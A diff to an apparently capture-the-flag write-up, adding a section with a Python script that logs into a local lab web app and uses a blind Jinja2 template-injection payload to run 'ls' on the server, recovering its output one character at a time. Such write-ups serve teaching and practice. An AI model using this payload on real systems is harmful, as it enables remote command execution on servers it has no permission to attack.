@@ -166,7 +166,42 @@ We find the flag!
 flag{7b5b91c60796488148ddf3b227735979}
 ```
 
-- ##
+- ## Mr O
+Payload was pssed into the heder which printed a response only if the desired output is found
+```
+from os import popen
+import string
+import requests
 
+SERVER_ADDR = "http://127.0.0.1:5000" # replace this with the actual IP of the docker
 
-- ##
+def get_cookie():
+    data = {
+        "username": "test",  # make sure to create a test:test user first
+        "password": "test" 
+    }
+
+    req = requests.post(SERVER_ADDR + "/login", data=data)  # Send login request
+    cookiejar = req.history[0].cookies  # Get cookies from the response history
+    cookie = cookiejar.get_dict()['session']  # Extract the session cookie
+
+    return cookie  # Return the session cookie as a string
+
+cookie = {"session": get_cookie()}  # Get session cookie
+final = ""  # Initialize an empty string to store the discovered directory contents
+
+while True:
+    for x in string.printable:  # Iterate over all printable characters
+        x = final + x  # Append the current character to the discovered string
+        payload = {
+            'message': "{% if request.application.__globals__.__builtins__.__import__('os').popen('ls').read().startswith('" + str(x) + "') %} found {% endif %}",
+            'username': 'admin'
+        }
+        r = requests.post(url=SERVER_ADDR + "/messages", data=payload, cookies=cookie)  # Send the payload
+        if 'found' in r.text:  # Check if the response contains 'found'
+            final = x  # Update the final string with the current character
+            print(final)  # Print the currently discovered part of the directory
+            break  # Break the loop to move on to the next character
+
+```
+Explanation for each script line mentioned above and running it, we get the flag
